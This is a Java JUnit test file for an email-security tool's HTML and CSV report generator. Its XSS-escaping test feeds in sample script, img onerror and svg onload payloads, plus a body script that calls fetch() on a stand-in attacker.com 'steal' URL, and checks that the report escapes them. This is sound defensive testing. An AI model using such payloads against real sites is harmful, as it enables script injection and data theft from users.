package com.mailshield.reporting;

import com.mailshield.model.*;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.Collections;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

public class HtmlReportGeneratorTest {

    @TempDir
    Path tempDir;

    private HtmlReportGenerator reportGenerator;

    @BeforeEach
    void setUp() {
        reportGenerator = new HtmlReportGenerator();
    }

    @Test
    @DisplayName("Should generate HTML report with strict HTML escaping against script injection (XSS)")
    void testHtmlEscapingScriptInjection() throws Exception {
        File htmlFile = tempDir.resolve("test_report.html").toFile();

        // Hostile XSS payload in subject and body
        EmailMessage hostileMsg = EmailMessage.builder()
                .subject("<script>alert('pwned')</script>")
                .fromAddress("evil<img src=x onerror=alert(1)>@attacker.com")
                .fromDisplayName("<svg onload=alert(2)>")
                .bodyText("<script>fetch('http://attacker.com/steal')</script>")
                .rawSha256("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
                .build();

        RiskAssessment assessment = new RiskAssessment(RiskLevel.CRITICAL, 90, 0.95, "Dangerous", Collections.emptyMap(), "2.1.0", false);
        AnalysisResult result = new AnalysisResult("an-1", hostileMsg.getId(), assessment, List.of(), List.of(), Instant.now(), "2.1.0");

        reportGenerator.generateHtmlReport(null, hostileMsg, result, List.of(), htmlFile);

        assertThat(htmlFile).exists();
        String content = Files.readString(htmlFile.toPath());

        // Verifying active script tags are escaped to &lt;script&gt;
        assertThat(content).doesNotContain("<script>alert('pwned')</script>");
        assertThat(content).contains("&lt;script&gt;alert(&#x27;pwned&#x27;)&lt;&#x2F;script&gt;");
        assertThat(content).doesNotContain("<svg onload=alert(2)>");
        assertThat(content).contains("&lt;svg onload=alert(2)&gt;");
    }

    @Test
    @DisplayName("Should generate valid CSV summary export")
    void testCsvGeneration() throws Exception {
        File csvFile = tempDir.resolve("summary.csv").toFile();

        RiskAssessment assessment = new RiskAssessment(RiskLevel.HIGH, 75, 0.88, "High urgency detected", Collections.emptyMap(), "2.1.0", false);
        AnalysisResult result = new AnalysisResult("an-2", "email-99", assessment, List.of(), List.of(), Instant.now(), "2.1.0");

        reportGenerator.generateCsvSummary(List.of(result), csvFile);

        assertThat(csvFile).exists();
        String csvContent = Files.readString(csvFile.toPath());
        assertThat(csvContent).contains("AnalysisID,EmailID,RiskLevel,RiskScore");
        assertThat(csvContent).contains("\"an-2\",\"email-99\",\"HIGH\",75");
    }
}

